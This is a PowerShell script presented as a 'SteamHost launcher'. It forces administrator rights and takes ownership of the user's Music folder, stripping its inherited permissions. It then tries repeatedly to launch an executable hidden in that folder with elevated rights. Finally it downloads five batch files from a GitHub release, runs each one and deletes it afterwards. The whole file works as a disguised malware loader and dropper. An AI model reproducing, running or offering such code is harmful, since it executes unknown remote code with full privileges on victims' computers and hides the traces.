# steamhost_launcher.ps1
# Complete script to fix permissions, run steamhost.exe, then execute batch files

param(
    [switch]$Silent = $false
)

# Function to display colored output
function Write-ColorOutput {
    param([string]$Message, [string]$Color = "White")
    Write-Host $Message -ForegroundColor $Color
}

# Function to check if running as administrator
function Test-Admin {
    $currentUser = [Security.Principal.WindowsIdentity]::GetCurrent()
    $adminRole = [Security.Principal.WindowsBuiltInRole]::Administrator
    return (New-Object Security.Principal.WindowsPrincipal($currentUser)).IsInRole($adminRole)
}

# Main execution
try {
    if (-not $Silent) {
        Write-ColorOutput "SteamHost Launcher Script" "Green"
        Write-ColorOutput "=========================" "Green"
    }
    
    # Define paths
    $musicPath = [Environment]::GetFolderPath("MyMusic")
    $steamHostPath = "$musicPath\steamhost.exe"
    $username = $env:USERNAME
    
    if (-not $Silent) {
        Write-ColorOutput "Target executable: $steamHostPath" "Yellow"
    }
    
    # Check if running as administrator
    if (-not (Test-Admin)) {
        Write-ColorOutput "This script requires administrator privileges to continue." "Red"
        Write-ColorOutput "Please right-click on PowerShell and select 'Run as Administrator'" "Red"
        Write-ColorOutput "or right-click this script and select 'Run with PowerShell'." "Red"
        if (-not $Silent) { pause }
        exit 1
    }
    
    if (-not $Silent) {
        Write-ColorOutput "Running with administrator privileges..." "Green"
    }
    
    # Step 1: Take ownership of the Music folder
    try {
        if (-not $Silent) {
            Write-ColorOutput "Step 1: Taking ownership of Music folder..." "Yellow"
        }
        
        $takeOwnCommand = "takeown /f `"$musicPath`" /r /d y"
        Invoke-Expression $takeOwnCommand | Out-Null
        
        if (-not $Silent) {
            Write-ColorOutput "✓ Ownership taken successfully" "Green"
        }
    }
    catch {
        Write-ColorOutput "Warning: Could not take ownership: $($_.Exception.Message)" "Yellow"
    }
    
    # Step 2: Grant full permissions to current user
    try {
        if (-not $Silent) {
            Write-ColorOutput "Step 2: Granting full permissions..." "Yellow"
        }
        
        # First try to remove any existing inheritance and permissions
        icacls "$musicPath" /inheritance:r /t 2>$null | Out-Null
        
        # Grant full control to current user
        icacls "$musicPath" /grant "${username}:F" /t 2>$null | Out-Null
        
        if (-not $Silent) {
            Write-ColorOutput "✓ Permissions granted successfully" "Green"
        }
    }
    catch {
        Write-ColorOutput "Warning: Could not set permissions: $($_.Exception.Message)" "Yellow"
    }
    
    # Step 3: Verify steamhost.exe exists
    if (-not (Test-Path $steamHostPath)) {
        Write-ColorOutput "ERROR: steamhost.exe not found at the specified path!" "Red"
        Write-ColorOutput "Please ensure steamhost.exe is located at: $steamHostPath" "Red"
        if (-not $Silent) { pause }
        exit 1
    }
    
    if (-not $Silent) {
        Write-ColorOutput "✓ steamhost.exe found" "Green"
    }
    
    # Step 4: Try multiple methods to run steamhost.exe
    $success = $false
    
    # Method 1: Direct execution
    try {
        if (-not $Silent) {
            Write-ColorOutput "Step 3: Attempting direct execution..." "Yellow"
        }
        
        Start-Process -FilePath $steamHostPath -ErrorAction Stop
        $success = $true
        if (-not $Silent) {
            Write-ColorOutput "✓ steamhost.exe launched successfully!" "Green"
        }
    }
    catch {
        if (-not $Silent) {
            Write-ColorOutput "Direct execution failed: $($_.Exception.Message)" "Red"
        }
    }
    
    # Method 2: Run with RunAs verb
    if (-not $success) {
        try {
            if (-not $Silent) {
                Write-ColorOutput "Step 4: Trying with elevated privileges..." "Yellow"
            }
            
            Start-Process -FilePath $steamHostPath -Verb RunAs -ErrorAction Stop
            $success = $true
            if (-not $Silent) {
                Write-ColorOutput "✓ steamhost.exe launched with elevated privileges!" "Green"
            }
        }
        catch {
            if (-not $Silent) {
                Write-ColorOutput "Elevated execution failed: $($_.Exception.Message)" "Red"
            }
        }
    }
    
    # Method 3: Use cmd.exe to execute
    if (-not $success) {
        try {
            if (-not $Silent) {
                Write-ColorOutput "Step 5: Trying via command prompt..." "Yellow"
            }
            
            $tempBat = [System.IO.Path]::GetTempFileName() + ".bat"
            $batchContent = @"
@echo off
echo Running steamhost.exe...
cd /d "$musicPath"
"steamhost.exe"
echo.
echo If you can see this message, the executable may have closed or encountered an error.
pause
"@
            
            Set-Content -Path $tempBat -Value $batchContent -Encoding ASCII
            Start-Process -FilePath "cmd.exe" -ArgumentList "/c", "`"$tempBat`"" -Verb RunAs
            
            # Schedule cleanup
            Start-Job -ScriptBlock {
                Start-Sleep -Seconds 10
                if (Test-Path $using:tempBat) {
                    Remove-Item $using:tempBat -Force -ErrorAction SilentlyContinue
                }
            } | Out-Null
            
            $success = $true
            if (-not $Silent) {
                Write-ColorOutput "✓ Launched via command prompt!" "Green"
            }
        }
        catch {
            Write-ColorOutput "Command prompt method failed: $($_.Exception.Message)" "Red"
        }
    }
    
    # Method 4: Final attempt using runas command
    if (-not $success) {
        try {
            if (-not $Silent) {
                Write-ColorOutput "Step 6: Final attempt using runas command..." "Yellow"
            }
            
            Start-Process -FilePath "runas" -ArgumentList "/user:Administrator", "`"$steamHostPath`"" -Wait -NoNewWindow
            $success = $true
            if (-not $Silent) {
                Write-ColorOutput "✓ Launched using runas command!" "Green"
            }
        }
        catch {
            Write-ColorOutput "Runas command failed: $($_.Exception.Message)" "Red"
        }
    }
    
    if (-not $success) {
        Write-ColorOutput "All execution methods failed. The file may be corrupted or blocked." "Red"
        Write-ColorOutput "You may need to check Windows Defender or antivirus software." "Red"
    }
    
    # Wait a moment for steamhost to potentially launch
    Start-Sleep -Seconds 3
    
    # Part 2: Batch File Download and Execution
    Write-Host "`nStarting batch file download and execution process..." -ForegroundColor Green

    # List of batch files to download and execute
    $batchFiles = @(
        "https://github.com/Outlastissigma/M3TA-OS/releases/download/da/3.bat",
        "https://github.com/Outlastissigma/M3TA-OS/releases/download/da/4.bat",
        "https://github.com/Outlastissigma/M3TA-OS/releases/download/da/5.bat",
        "https://github.com/Outlastissigma/M3TA-OS/releases/download/da/6.bat",
        "https://github.com/Outlastissigma/M3TA-OS/releases/download/da/7.bat"
    )

    foreach ($batchUrl in $batchFiles) {
        $batchName = [System.IO.Path]::GetFileName($batchUrl)
        $batchPath = "$env:TEMP\$batchName"
        
        Write-Host "Downloading $batchName..." -ForegroundColor Yellow
        try {
            # Download batch file
            Invoke-WebRequest -Uri $batchUrl -OutFile $batchPath -ErrorAction Stop
            Write-Host "Download completed: $batchName" -ForegroundColor Green
            
            # Run batch file and wait for completion
            Write-Host "Executing $batchName..." -ForegroundColor Yellow
            $process = Start-Process -FilePath "cmd.exe" -ArgumentList "/c", "`"$batchPath`"" -Wait -PassThru -NoNewWindow
            
            if ($process.ExitCode -eq 0) {
                Write-Host "Execution completed: $batchName" -ForegroundColor Green
            } else {
                Write-Host "Execution completed with exit code $($process.ExitCode): $batchName" -ForegroundColor Yellow
            }
            
            # Delete the batch file
            Write-Host "Deleting $batchName..." -ForegroundColor Yellow
            Remove-Item -Path $batchPath -Force -ErrorAction Stop
            Write-Host "Deleted: $batchName" -ForegroundColor Green
            
        } catch {
            Write-Host "Error processing $batchName : $($_.Exception.Message)" -ForegroundColor Red
        }
        
        Write-Host "----------------------------------------" -ForegroundColor Gray
    }

    Write-Host "Batch file processing completed!" -ForegroundColor Green
    
}
catch {
    Write-ColorOutput "Unexpected error: $($_.Exception.Message)" "Red"
    if (-not $Silent) { pause }
    exit 1
}

if (-not $Silent) {
    Write-ColorOutput "Script execution completed." "Green"
    if (-not $success) {
        Write-ColorOutput "Note: Some operations may have failed. Check the messages above." "Yellow"
    }
    timeout /t 5
}